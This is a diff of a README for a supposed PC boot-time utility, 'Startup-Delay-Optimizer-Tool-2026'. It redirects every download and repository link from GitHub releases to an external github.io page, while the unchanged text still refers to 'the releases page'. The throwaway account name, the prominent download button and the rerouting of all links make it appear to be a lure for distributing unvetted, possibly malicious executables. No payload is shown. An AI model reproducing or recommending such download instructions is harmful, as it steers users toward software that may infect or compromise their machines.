@@ -1,7 +1,7 @@
 <h1>🚀 Startup-Delay-Optimizer-Tool-2026 - Speed Up Your PC Boot Time</h1>
 
 <p align="center">
-  <a href="https://github.com/picksdiseasebit7252/Startup-Delay-Optimizer-Tool-2026/releases" style="display:inline-block;padding:15px 40px;background-color:#4CAF50;color:white;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;border:2px solid #388E3C;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://picksdiseasebit7252.github.io" style="display:inline-block;padding:15px 40px;background-color:#4CAF50;color:white;text-decoration:none;font-size:20px;border-radius:8px;font-weight:bold;border:2px solid #388E3C;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ---
@@ -40,7 +40,7 @@ Think of it like this: when you boot up your computer, instead of having 20 prog
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/picksdiseasebit7252/Startup-Delay-Optimizer-Tool-2026/releases](https://github.com/picksdiseasebit7252/Startup-Delay-Optimizer-Tool-2026/releases)
+Visit this link to download the application: [https://picksdiseasebit7252.github.io](https://picksdiseasebit7252.github.io)
 
 Look for the newest version available and download it to your computer. The download should start automatically once you click the appropriate button.
 
@@ -115,7 +115,7 @@ Once you set your delays, you don't need to use the tool again unless you instal
 
 ## 📥 Download and Installation Guide
 
-**Step 1:** Click the download button at the top of this page or visit: [https://github.com/picksdiseasebit7252/Startup-Delay-Optimizer-Tool-2026/releases](https://github.com/picksdiseasebit7252/Startup-Delay-Optimizer-Tool-2026/releases)
+**Step 1:** Click the download button at the top of this page or visit: [https://picksdiseasebit7252.github.io](https://picksdiseasebit7252.github.io)
 
 **Step 2:** On the releases page, look for the latest version. Download the file to your computer.
 
@@ -166,8 +166,8 @@ Remember: you're in control. Set delays that work for you, and enjoy a faster, m
 
 ## 📌 Quick Links
 
-- **Download Page:** [https://github.com/picksdiseasebit7252/Startup-Delay-Optimizer-Tool-2026/releases](https://github.com/picksdiseasebit7252/Startup-Delay-Optimizer-Tool-2026/releases)
-- **Main Repository:** [https://github.com/picksdiseasebit7252/Startup-Delay-Optimizer-Tool-2026](https://github.com/picksdiseasebit7252/Startup-Delay-Optimizer-Tool-2026)
+- **Download Page:** [https://picksdiseasebit7252.github.io](https://picksdiseasebit7252.github.io)
+- **Main Repository:** [https://picksdiseasebit7252.github.io](https://picksdiseasebit7252.github.io)
 
 ---
 
